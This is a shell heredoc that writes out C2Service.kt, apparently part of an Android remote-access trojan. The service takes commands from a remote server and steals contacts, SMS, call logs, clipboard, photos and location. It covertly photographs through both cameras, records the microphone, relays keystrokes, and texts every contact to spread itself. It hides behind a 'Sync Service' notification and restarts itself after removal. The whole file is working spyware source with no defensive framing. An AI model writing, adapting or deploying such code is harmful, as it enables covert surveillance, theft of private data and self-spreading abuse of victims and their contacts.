cat > app/src/main/java/com/c2/client/C2Service.kt << 'EOF'
package com.c2.client

import android.Manifest
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaPlayer
import android.media.MediaRecorder
import android.net.Uri
import android.os.*
import android.provider.*
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import io.socket.client.IO
import io.socket.client.Socket
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.URLEncoder
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

class C2Service : Service() {

    private val TAG = "c2"
    private var socket: Socket? = null
    private val http = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(5, TimeUnit.MINUTES)
        .writeTimeout(5, TimeUnit.MINUTES)
        .retryOnConnectionFailure(true)
        .build()

    private lateinit var deviceId: String
    private val socketReady = AtomicBoolean(false)
    private val lastServerSeen = AtomicLong(System.currentTimeMillis())
    private val reconnecting = AtomicBoolean(false)

    private var recorder: MediaRecorder? = null
    private var player: MediaPlayer? = null
    private var heartbeatThread: Thread? = null
    private var locationRegistered = false

    private val locationListener = object : LocationListener {
        override fun onLocationChanged(l: Location) {
            try {
                val o = JSONObject()
                    .put("lat", l.latitude)
                    .put("lon", l.longitude)
                    .put("acc", l.accuracy.toDouble())
                Emitter.emitLocation(socket, o)
            } catch (_: Exception) {}
        }
        override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
        override fun onProviderEnabled(p: String) {}
        override fun onProviderDisabled(p: String) {}
    }

    override fun onCreate() {
        super.onCreate()
        INSTANCE = this
        deviceId = Config.deviceUuid(this)
        createChannel()
        startForegroundCompat(buildNotif("idle"))

        KeyloggerService.onKey = { text ->
            try {
                if (socketReady.get()) socket?.emit("text", "KEY: $text")
            } catch (_: Exception) {}
        }

        requestBatteryOpt()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (socket == null) connect()
        else if (!socketReady.get()) requestReconnect()
        startHeartbeat()
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            val restart = Intent(applicationContext, C2Service::class.java)
            val pi = PendingIntent.getService(
                this, 1, restart,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
            val am = getSystemService(ALARM_SERVICE) as AlarmManager
            am.set(AlarmManager.RTC, System.currentTimeMillis() + 1000L, pi)
        } catch (_: Exception) {}
        super.onTaskRemoved(rootIntent)
    }

    override fun onBind(intent: Intent?) = null

    override fun onDestroy() {
        try { socket?.disconnect(); socket?.off() } catch (_: Exception) {}
        heartbeatThread?.let { try { it.interrupt() } catch (_: Exception) {} }
        heartbeatThread = null
        if (locationRegistered) {
            try {
                val lm = getSystemService(LOCATION_SERVICE) as LocationManager
                lm.removeUpdates(locationListener)
            } catch (_: Exception) {}
            locationRegistered = false
        }
        try { recorder?.release() } catch (_: Exception) {}
        try { player?.release() } catch (_: Exception) {}
        INSTANCE = null
        super.onDestroy()
    }

    private fun startForegroundCompat(notif: Notification) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                    == PackageManager.PERMISSION_GRANTED)
                types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                    == PackageManager.PERMISSION_GRANTED)
                types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED)
                types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION

            try {
                startForeground(NOTIF_ID, notif, types)
                return
            } catch (_: Exception) {}
            try {
                startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                return
            } catch (_: Exception) {}
        }
        @Suppress("DEPRECATION")
        startForeground(NOTIF_ID, notif)
    }

    private fun requestBatteryOpt() {
        try {
            val i = Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                .setData(Uri.parse("package:$packageName"))
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(i)
        } catch (_: Exception) {}
    }

    private fun connect() {
        if (reconnecting.getAndSet(true)) return
        val url = Config.getUrl(this)
        if (url.isBlank() || !url.startsWith("http")) {
            updateNotif("no url")
            reconnecting.set(false)
            return
        }

        Thread {
            try {
                val opts = IO.Options().apply {
                    forceNew = true
                    reconnection = true
                    reconnectionDelay = 1000
                    reconnectionDelayMax = 5000
                    randomizationFactor = 0.5
                    timeout = 15000
                    transports = arrayOf("websocket", "polling")
                    extraHeaders = mapOf(
                        "x-model" to Build.MODEL,
                        "x-device-uuid" to deviceId
                    )
                }
                try { socket?.off() } catch (_: Exception) {}
                try { socket?.disconnect() } catch (_: Exception) {}
                socket = IO.socket(url, opts)

                socket!!.on(Socket.EVENT_CONNECT) {
                    socketReady.set(true)
                    lastServerSeen.set(System.currentTimeMillis())
                    updateNotif("on")
                    sendLocation()
                    startLocationUpdates()
                }
                socket!!.on(Socket.EVENT_DISCONNECT) { socketReady.set(false) }
                socket!!.on(Socket.EVENT_CONNECT_ERROR) { socketReady.set(false) }

                socket!!.on("commend") { args ->
                    lastServerSeen.set(System.currentTimeMillis())
                    try {
                        val obj = args.firstOrNull() as? JSONObject ?: return@on
                        dispatch(obj.optString("request"), obj.optJSONArray("extras") ?: JSONArray())
                    } catch (_: Exception) {}
                }
                socket!!.on("ping") { lastServerSeen.set(System.currentTimeMillis()) }

                socket!!.connect()
            } catch (e: Exception) {
                Log.w(TAG, "c:${e.message}")
            } finally {
                reconnecting.set(false)
            }
        }.start()
    }

    private fun startHeartbeat() {
        if (heartbeatThread != null) return
        heartbeatThread = Thread {
            while (true) {
                try {
                    Thread.sleep(15_000L)
                    val now = System.currentTimeMillis()
                    if (socketReady.get()) {
                        try { socket?.emit("ping") } catch (_: Exception) {}
                    }
                    if (now - lastServerSeen.get() > 45_000L || !socketReady.get()) {
                        try { socket?.disconnect() } catch (_: Exception) {}
                        try { socket?.connect() } catch (_: Exception) {}
                        lastServerSeen.set(now)
                    }
                } catch (_: InterruptedException) { break }
                catch (_: Exception) {}
            }
        }.apply { isDaemon = true; start() }
    }

    private fun dispatch(cmd: String, extras: JSONArray) {
        Thread {
            try {
                when (cmd) {
                    "contacts"         -> sendContacts()
                    "all-sms"          -> sendAllSms()
                    "calls"            -> sendCalls()
                    "time"             -> sendTime()
                    "main-camera"      -> takePhoto(false)
                    "selfie-camera"    -> takePhoto(true)
                    "screenshot"       -> screenshot()
                    "gallery"          -> sendGallery()
                    "apps"             -> sendApps()
                    "file"             -> sendFiles()
                    "clipboard"        -> sendClipboard()
                    "location"         -> sendLocation()
                    "toast"            -> showToast(extra(extras, "toastText"))
                    "vibrate"          -> vibrate(extra(extras, "duration").toLongOrNull() ?: 1000L)
                    "openUrl"          -> openUrl(extra(extras, "url"))
                    "microphone"       -> recordAudio(extra(extras, "duration").toIntOrNull() ?: 10)
                    "play-audio"       -> playAudio()
                    "stop-audio"       -> stopAudio()
                    "sendSms"          -> sendSms(extra(extras, "number"), extra(extras, "text"))
                    "smsToAllContacts" -> smsToAll(extra(extras, "text"))
                    "keylogger-on"     -> KeyloggerService.enabled = true
                    "keylogger-off"    -> KeyloggerService.enabled = false
                    else               -> Log.i(TAG, cmd)
                }
            } catch (_: Exception) {}
        }.apply { isDaemon = true; start() }
    }

    private fun extra(arr: JSONArray, key: String): String {
        for (i in 0 until arr.length()) {
            val o = arr.optJSONObject(i) ?: continue
            if (o.optString("key") == key) return o.optString("value", "")
        }
        return ""
    }

    private fun upload(file: File, tag: String = "") {
        try {
            val base = Config.getUrl(this).trimEnd('/')
            if (base.isBlank()) return
            val url = "$base/upload?id=" + URLEncoder.encode(deviceId, "UTF-8") +
                    (if (tag.isNotEmpty()) "&t=$tag" else "")
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("file", file.name,
                    file.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
                .build()
            http.newCall(Request.Builder().url(url).post(body).build())
                .enqueue(object : Callback {
                    override fun onFailure(c: Call, e: java.io.IOException) {}
                    override fun onResponse(c: Call, r: Response) { r.close() }
                })
        } catch (_: Exception) {}
    }

    private fun sendContacts() {
        val sb = StringBuilder()
        try {
            contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )?.use {
                while (it.moveToNext()) {
                    sb.append(it.getString(it.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append("|")
                      .append(it.getString(it.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n")
                }
            }
        } catch (_: Exception) {}
        socket?.emit("text", "CONTACTS:\n$sb")
    }

    private fun sendAllSms() {
        val sb = StringBuilder()
        try {
            contentResolver.query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 200"
            )?.use {
                while (it.moveToNext()) {
                    sb.append(it.getString(it.getColumnIndexOrThrow("address"))).append("|")
                      .append(it.getString(it.getColumnIndexOrThrow("date"))).append("|")
                      .append(it.getString(it.getColumnIndexOrThrow("body"))).append("\n")
                }
            }
        } catch (_: Exception) {}
        socket?.emit("text", "SMS:\n$sb")
    }

    private fun sendCalls() {
        val sb = StringBuilder()
        try {
            contentResolver.query(
                CallLog.Calls.CONTENT_URI, null, null, null,
                "${CallLog.Calls.DATE} DESC LIMIT 200"
            )?.use {
                while (it.moveToNext()) {
                    sb.append(it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))).append("|")
                      .append("t=").append(it.getString(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))).append("|")
                      .append("d=").append(it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))).append("s|")
                      .append(it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DATE))).append("\n")
                }
            }
        } catch (_: Exception) {}
        socket?.emit("text", "CALLS:\n$sb")
    }

    private fun sendTime() {
        socket?.emit("text", "TIME: ${System.currentTimeMillis()}")
    }

    private fun sendApps() {
        val sb = StringBuilder()
        try {
            val list = packageManager.getInstalledPackages(0)
            for (p in list) {
                sb.append(p.packageName).append("|")
                  .append(p.applicationInfo?.loadLabel(packageManager)).append("\n")
            }
        } catch (_: Exception) {}
        socket?.emit("text", "APPS:\n$sb")
    }

    private fun sendFiles() {
        val sb = StringBuilder()
        try {
            val files = Environment.getExternalStorageDirectory().listFiles()
            if (files != null) {
                for (f in files) {
                    sb.append(f.name).append("|")
                      .append(if (f.isDirectory) "d" else "${f.length()}").append("\n")
                }
            }
        } catch (_: Exception) {}
        socket?.emit("text", "FILES:\n$sb")
    }

    private fun sendClipboard() {
        try {
            val cm = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
            socket?.emit("text", "CLIPBOARD:\n${cm.primaryClip?.getItemAt(0)?.text ?: ""}")
        } catch (_: Exception) {}
    }

    private fun sendGallery() {
        val sb = StringBuilder()
        val files = mutableListOf<File>()
        try {
            contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                null, null, null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 50"
            )?.use {
                while (it.moveToNext()) {
                    val p = it.getString(it.getColumnIndexOrThrow(
                        MediaStore.Images.Media.DATA)) ?: continue
                    sb.append(p).append("\n")
                    val f = File(p)
                    if (f.exists() && f.length() < 5L * 1024 * 1024) files.add(f)
                }
            }
        } catch (_: Exception) {}
        socket?.emit("text", "GALLERY:\n$sb")
        files.take(10).forEach { upload(it, "gallery") }
    }

    private fun sendLocation() {
        try {
            val lm = getSystemService(LOCATION_SERVICE) as LocationManager
            @Suppress("MissingPermission")
            val best = lm.getProviders(true)
                .mapNotNull { try { lm.getLastKnownLocation(it) } catch (_: Exception) { null } }
                .maxByOrNull { it.time }
            if (best == null) {
                socket?.emit("text", "LOCATION: null")
                return
            }
            val o = JSONObject()
                .put("lat", best.latitude)
                .put("lon", best.longitude)
                .put("acc", best.accuracy.toDouble())
            Emitter.emitLocation(socket, o)
        } catch (_: Exception) {}
    }

    private fun startLocationUpdates() {
        if (locationRegistered) return
        try {
            val lm = getSystemService(LOCATION_SERVICE) as LocationManager
            @Suppress("MissingPermission")
            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60_000L, 10f, locationListener)
            @Suppress("MissingPermission")
            lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 120_000L, 50f, locationListener)
            locationRegistered = true
        } catch (_: Exception) {}
    }

    private fun takePhoto(front: Boolean) {
        Thread {
            var cam: Camera? = null
            try {
                val facing = if (front) Camera.CameraInfo.CAMERA_FACING_FRONT
                             else Camera.CameraInfo.CAMERA_FACING_BACK
                val found = (0 until Camera.getNumberOfCameras()).firstOrNull { i ->
                    val info = Camera.CameraInfo()
                    Camera.getCameraInfo(i, info)
                    info.facing == facing
                } ?: return@Thread

                cam = Camera.open(found)
                cam.parameters = cam.parameters.apply {
                    pictureFormat = ImageFormat.JPEG
                    jpegQuality = 85
                }
                cam.setPreviewTexture(SurfaceTexture(0))
                cam.startPreview()
                val c = cam
                cam.takePicture(null, null, Camera.PictureCallback { data, _ ->
                    try {
                        val f = File(cacheDir, "x${System.currentTimeMillis()}.jpg")
                        f.writeBytes(data)
                        upload(f, if (front) "selfie" else "cam")
                        f.delete()
                    } catch (_: Exception) {}
                    try { c.stopPreview(); c.release() } catch (_: Exception) {}
                })
            } catch (_: Exception) {
                try { cam?.release() } catch (_: Exception) {}
            }
        }.apply { isDaemon = true }.start()
    }

    private fun screenshot() {
        Thread {
            val path = "/sdcard/.x${System.currentTimeMillis()}.png"
            try {
                val ok = Runtime.getRuntime()
                    .exec(arrayOf("su", "-c", "screencap -p $path"))
                    .waitFor() == 0
                if (ok) {
                    val f = File(path)
                    if (f.exists()) {
                        upload(f, "screenshot")
                        f.delete()
                        return@Thread
                    }
                }
            } catch (_: Exception) {}
            socket?.emit("text", "SS_FAIL")
        }.apply { isDaemon = true }.start()
    }

    private fun showToast(m: String) {
        Handler(Looper.getMainLooper()).post {
            try {
                android.widget.Toast.makeText(this, m, android.widget.Toast.LENGTH_LONG).show()
            } catch (_: Exception) {}
        }
    }

    private fun vibrate(ms: Long) {
        try {
            val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
            else @Suppress("DEPRECATION") v.vibrate(ms)
        } catch (_: Exception) {}
    }

    private fun openUrl(url: String) {
        if (url.isBlank()) return
        try {
            startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url))
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
        } catch (_: Exception) {}
    }

    private fun sendSms(num: String, text: String) {
        try {
            android.telephony.SmsManager.getDefault()
                .sendTextMessage(num, null, text, null, null)
            socket?.emit("text", "SMS_SENT: $num")
        } catch (e: Exception) {
            socket?.emit("text", "SMS_FAIL: ${e.message}")
        }
    }

    private fun smsToAll(text: String) {
        if (text.isBlank()) return
        try {
            val sm = android.telephony.SmsManager.getDefault()
            var n = 0
            contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )?.use {
                while (it.moveToNext() && n < 200) {
                    val num = it.getString(it.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: continue
                    try {
                        sm.sendTextMessage(num, null, text, null, null)
                        n++
                    } catch (_: Exception) {}
                }
            }
            socket?.emit("text", "WORM: $n")
        } catch (_: Exception) {}
    }

    private fun recordAudio(seconds: Int) {
        Thread {
            try {
                val f = File(cacheDir, "m${System.currentTimeMillis()}.m4a")
                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                    MediaRecorder(this@C2Service)
                else
                    @Suppress("DEPRECATION") MediaRecorder()
                recorder!!.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioSamplingRate(44100)
                    setAudioEncodingBitRate(96000)
                    setOutputFile(f.absolutePath)
                    prepare()
                    start()
                }
                Thread.sleep(seconds.coerceIn(1, 300) * 1000L)
                try { recorder?.stop() } catch (_: Exception) {}
                try { recorder?.release() } catch (_: Exception) {}
                recorder = null
                if (f.exists()) {
                    upload(f, "mic")
                    f.delete()
                }
            } catch (e: Exception) {
                socket?.emit("text", "MIC_FAIL: ${e.message}")
            }
        }.apply { isDaemon = true }.start()
    }

    private fun playAudio() {
        try {
            player?.release()
            player = MediaPlayer().apply {
                setDataSource("https://example.com/loop.mp3")
                isLooping = true
                prepare()
                start()
            }
        } catch (_: Exception) {}
    }

    private fun stopAudio() {
        try { player?.stop(); player?.release(); player = null } catch (_: Exception) {}
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel("c2", "Sync Service", NotificationManager.IMPORTANCE_MIN)
            ch.setShowBadge(false)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
    }

    private fun buildNotif(text: String): Notification {
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        return NotificationCompat.Builder(this, "c2")
            .setContentTitle("Sync Service")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setContentIntent(pi)
            .build()
    }

    private fun updateNotif(text: String) {
        try {
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .notify(NOTIF_ID, buildNotif(text))
        } catch (_: Exception) {}
    }

    companion object {
        const val NOTIF_ID = 0xC2
        @Volatile private var INSTANCE: C2Service? = null
        fun requestReconnect() {
            INSTANCE?.let {
                try { it.socket?.disconnect() } catch (_: Exception) {}
                try { it.socket?.connect() } catch (_: Exception) {}
            }
        }
    }
}
EOF

echo "═══ C2Service.kt done ═══"
